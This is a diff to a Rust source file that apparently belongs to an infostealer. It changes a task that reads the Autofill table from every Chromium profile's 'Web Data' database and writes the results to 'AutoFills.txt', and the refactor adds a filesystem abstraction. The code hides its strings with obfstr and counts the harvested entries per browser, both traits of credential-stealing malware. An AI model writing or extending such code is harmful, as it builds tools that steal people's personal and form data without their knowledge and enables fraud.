@@ -1,12 +1,14 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{AutoFill, collect_and_read_sqlite_from_all_profiles, to_string_and_write_all};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, AutoFill};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{Task, parent_name};
-use utils::path::Path;
+use tasks::{parent_name, Task};
 
 const AUTOFILL_NAME: usize = 0;
 const AUTOFILL_VALUE: usize = 1;
@@ -22,12 +24,13 @@ impl AutoFillTask {
     }
 }
 
-impl<C: Collector> Task<C> for AutoFillTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
     parent_name!("AutoFills.txt");
 
-    fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("Web Data"),
             s!("Autofill"),
             extract_autofill_from_record,
@@ -42,7 +45,7 @@ impl<C: Collector> Task<C> for AutoFillTask {
             .get_browser()
             .increase_auto_fills_by(autofills.len());
 
-        let _ = to_string_and_write_all(&autofills, "\n\n", parent);
+        let _ = to_string_and_write_all(&autofills, "\n\n", filesystem, parent);
     }
 }
 
